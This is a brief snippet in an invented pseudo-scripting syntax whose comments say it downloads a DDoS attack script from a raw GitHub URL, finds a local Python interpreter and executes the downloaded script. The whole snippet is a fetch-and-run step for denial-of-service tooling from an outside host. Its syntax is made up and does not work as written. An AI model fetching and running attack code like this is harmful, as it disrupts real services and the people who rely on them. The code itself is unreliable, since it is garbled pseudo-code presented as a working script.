import[script.raw.git('https://raw.githubusercontent.com/Ha3MrX/DDos-Attack/master/ddos-attack.py')] //imports the dos scripts and saves it
    par(stor='DDoSScript')
import[interpreter.py.from({C:/ProgramFiles/Python/int.exe})]  //imports the python interpreter
    par(stor='int_path')

load[script.from[import(script.raw('DDoSScript'))]] //loads the dos script
    par(into={exec})
execute[exec[content]] //executes the dos script
    par(intepreter(interpreter.py.from('int_path')))
